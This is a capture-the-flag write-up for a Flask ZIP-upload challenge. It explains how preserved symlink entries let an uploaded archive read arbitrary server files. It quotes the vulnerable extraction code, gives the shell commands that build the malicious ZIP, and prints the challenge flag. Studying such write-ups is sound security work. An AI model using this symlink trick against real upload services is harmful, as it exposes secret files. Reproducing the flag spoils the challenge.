# unpack — Writeup

**Category:** Web  
**Flag:** `ictf{z1p_sl1p_r34d_4nywh3r3_89276230}`

---

## Overview

A Flask web application that accepts ZIP uploads and extracts them server-side. The extraction faithfully preserves Unix symlink attributes — allowing an attacker to plant a symlink in the ZIP pointing at any file on the server filesystem. The download endpoint follows symlinks, leaking arbitrary files.

---

The challenge is a Flask web application that accepts ZIP archive uploads, extracts them server-side, and serves the extracted files for individual download. The extraction routine faithfully preserves Unix file attributes, including the **symlink bit** — allowing an attacker to plant a symlink inside a ZIP that points at any file on the server filesystem.

---

## Vulnerability Analysis

In `app.py`, the extraction loop reads the `external_attr` field of each ZIP entry to determine the Unix file type:

```python
unix_attr = member.external_attr >> 16
...
if stat.S_ISLNK(unix_attr):
    link_target = zf.read(member.filename).decode()
    os.symlink(link_target, dest_path)   # ← arbitrary symlink created on disk
```

The download endpoint then calls `send_file(file_path, ...)`, which follows symlinks:

```python
return send_file(file_path, as_attachment=True, download_name=download_name)
```

Path traversal for the destination is blocked by a `startswith` check, but the *target* of the symlink is never validated — it may point anywhere on the filesystem, including `/etc/flag.txt` or any other sensitive file.

---

## Exploitation

### Manual

```bash
# 1. Create a symlink pointing at the flag
ln -s /etc/flag.txt flag.link

# 2. Package it into a ZIP preserving the symlink attribute
zip --symlinks evil.zip flag.link

# 3. Upload evil.zip to the service
# 4. Click download on "flag.link" in the resulting file list
# 5. Read the flag
```

### Automated

```bash
python3 exploit.py http://localhost:5000
```

The script creates the malicious ZIP in memory, uploads it, extracts the download token, and fetches the flag in a single run.

## Flag

`ictf{z1p_sl1p_r34d_4nywh3r3_89276230}`
